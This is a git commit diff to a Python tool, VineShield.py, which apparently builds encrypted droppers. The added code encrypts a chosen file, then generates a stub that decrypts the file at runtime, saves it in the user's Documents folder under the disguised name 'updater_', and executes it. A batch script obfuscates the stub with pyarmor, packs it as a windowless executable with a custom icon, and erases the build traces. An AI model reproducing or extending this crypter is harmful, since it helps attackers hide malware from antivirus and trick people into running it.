f94bc86fb057271dcee79032fee3376eba618837
Nick Vinesmoke <123866627+Nick-Vinesmoke@users.noreply.github.com>
2023-06-21 19:09:44 +0300

    almost done

--- VineShield.py
+++ VineShield.py
@@ -55,10 +55,87 @@ $dependencies\n\tinstall all dependencies
         print(style.BLUE+"[?]name of build",end="")
         print(style.VIOLET+">>> ",end="")
         name = str(input(style.CYAN))
-        print(style.BLUE+"[?]path to icon or none",end="")
+        print(style.BLUE+"[?]path to icon(necessarily)",end="")
         print(style.VIOLET+">>> ",end="")
         icon = str(input(style.CYAN))
         input(style.YELLOW+"[i]press enter to start")
+
+        key = Fernet.generate_key()
+        f = Fernet(key)
+
+        with open(file_crypt[0], 'rb') as file:
+            file_data = file.read()
+
+        encrypted_data = f.encrypt(file_data)
+        
+        new_name = f.encrypt(file_crypt[1].encode())
+
+        with open(f"enc_{file_crypt[1]}", 'wb') as file:
+            file.write(encrypted_data)
+
+        code = fr'''
+from cryptography.fernet import Fernet
+import os, sys
+
+key = {key}
+f = Fernet(key)
+
+name = f.decrypt({new_name}).decode()
+try:
+    base_path = sys._MEIPASS
+except Exception:
+    base_path = os.path.abspath(".")
+sa = os.path.join(base_path, "enc_" + name)
+
+
+
+with open(sa, 'rb') as file:
+    encrypted_data = file.read()
+
+decrypted_data = f.decrypt(encrypted_data)
+
+with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name, 'wb') as file:
+    file.write(decrypted_data)
+os.system(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name)
+'''
+        
+        batCode = fr'''
+@echo off >> log.txt
+chcp 65001 >> log.txt
+color 2 >> log.txt
+setlocal enabledelayedexpansion >> log.txt
+set progress=0 >> log.txt
+set max=100 >> log.txt
+echo Progress: [0%%]
+pyarmor gen "{name}.py" >> log.txt
+echo Progress: [10%%]
+cd dist >> log.txt
+echo Progress: [40%%]
+pyinstaller -F -w -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt[1]};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" --hidden-import "tkinter" --hidden-import "tkinter.messagebox" "{name}.py" >> log.txt
+cd dist >> log.txt
+echo Progress: [80%%]
+mkdir ..\..\build\ >> log.txt
+move "{name}.exe" ../../build >> log.txt
+cd ../../ >> log.txt
+RD /s /q dist >> log.txt
+RD /s /q __pycache__ >> log.txt
+del /s /q "enc_{file_crypt[1]}" >> log.txt
+del /s /q "{name}.py" >> log.txt
+del /s /q "{name}.bat" >> log.txt
+echo "Progress: [100%%]"
+echo "The scripted build file is located in the build/ folder"
+pause'''
+
+        with open(f"{name}.py", 'w', encoding='utf-8') as f:
+            f.write(code)
+
+        with open(f"{name}.bat", 'w', encoding='utf-8') as f:
+            f.write(batCode)
+
+        f = open("log.txt", 'w', encoding='utf-8')
+        f.close()
+
+        os.startfile(f"{name}.bat")
 
 
 
